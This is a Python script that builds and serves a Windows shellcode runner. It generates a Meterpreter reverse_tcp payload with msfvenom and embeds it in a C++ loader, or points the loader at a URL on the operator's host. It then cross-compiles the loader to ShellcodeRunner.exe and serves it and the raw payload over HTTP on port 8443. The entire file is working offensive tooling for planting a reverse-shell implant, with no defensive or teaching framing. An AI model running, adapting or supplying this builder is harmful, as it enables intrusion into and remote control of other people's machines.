import os
import subprocess
import sys
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
import threading
import shutil

def copy_and_rename(src, dst):
    if os.path.exists(dst):
        os.remove(dst)
    shutil.copy(src, dst)

def generate_shellcode_hardcoded(lhost):
    print("Generating shellcode with msfvenom...")
    payload = subprocess.check_output(["msfvenom", "-p", "windows/x64/meterpreter/reverse_tcp", f"LHOST={lhost}", "LPORT=4444", "-f", "c"]).decode()
    print("Shellcode generated.")

    copy_and_rename('sources/1.cpp', 'sources/shellcoderunner.cpp')

    with open('sources/shellcoderunner.cpp', 'r') as file:
        code = file.read()

    updated_code = code.replace('"SHELLCODE HERE"', payload.strip())

    with open('sources/shellcoderunner.cpp', 'w') as file:
        file.write(updated_code)

    print("shellcoderunner.cpp updated with new shellcode.")

def generate_shellcode_http(lhost):
    print("Generating shellcode with msfvenom...")
    subprocess.check_output(["msfvenom", "-p", "windows/x64/meterpreter/reverse_tcp", f"LHOST={lhost}", "LPORT=4444", "-f", "raw", "-o", "loader.bin"])
    print("Shellcode generated and saved as loader.bin.")

    copy_and_rename('sources/2.cpp', 'sources/shellcoderunnerhttp.cpp')

    with open('sources/shellcoderunnerhttp.cpp', 'r') as file:
        code = file.read()

    updated_code = code.replace('http://your-server.com/shellcode.bin', f'http://{lhost}:8443/loader.bin')

    with open('sources/shellcoderunnerhttp.cpp', 'w') as file:
        file.write(updated_code)

    print("shellcoderunnerhttp.cpp updated with new shellcode URL.")

def compile_code(file):
    print(f"Compiling {file}...")
    compile_result = subprocess.run([
        "x86_64-w64-mingw32-g++", "-o", "ShellcodeRunner.exe", file,
        "-static-libgcc", "-static-libstdc++", "-Wl,-Bstatic", "-lstdc++", "-Wl,-Bdynamic",
        "-lwininet", "-lws2_32"
    ], capture_output=True)
    if compile_result.returncode == 0:
        print(f"{file} compiled successfully.")
        if not os.path.exists('running'):
            os.makedirs('running')
        shutil.move('ShellcodeRunner.exe', 'running/ShellcodeRunner.exe')
        print("ShellcodeRunner.exe moved to running folder.")
    else:
        print(f"Failed to compile {file}.")
        print(compile_result.stdout.decode())
        print(compile_result.stderr.decode())

def start_http_server():
    handler = SimpleHTTPRequestHandler
    os.chdir('running')  # Change the directory to 'running' where the compiled executable and loader.bin are
    httpd = TCPServer(("", 8443), handler)
    print("Serving on port 8443")
    httpd.serve_forever()

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 script.py [hardcoded|http] [LHOST]")
        sys.exit(1)

    option = sys.argv[1]
    lhost = sys.argv[2]

    if option == "hardcoded":
        generate_shellcode_hardcoded(lhost)
        compile_code('sources/shellcoderunner.cpp')
        threading.Thread(target=start_http_server).start()
    elif option == "http":
        generate_shellcode_http(lhost)
        compile_code('sources/shellcoderunnerhttp.cpp')
        if not os.path.exists('running'):
            os.makedirs('running')
        shutil.move('loader.bin', 'running/loader.bin')
        threading.Thread(target=start_http_server).start()
    else:
        print("Invalid option. Use 'hardcoded' or 'http'.")
        sys.exit(1)

if __name__ == "__main__":
    main()
